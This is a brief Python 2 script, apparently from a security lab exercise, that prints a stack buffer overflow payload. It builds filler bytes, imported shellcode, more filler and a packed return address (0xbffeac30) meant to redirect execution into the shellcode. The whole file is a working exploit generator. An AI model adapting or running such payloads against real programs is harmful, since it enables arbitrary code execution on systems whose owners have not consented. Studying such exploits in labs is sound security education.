from shellcode import shellcode
from struct import pack

buf1 = '0'*800
buf2 = '0'*213

print buf1+shellcode+buf2+pack("<I", 0xbffeac30)
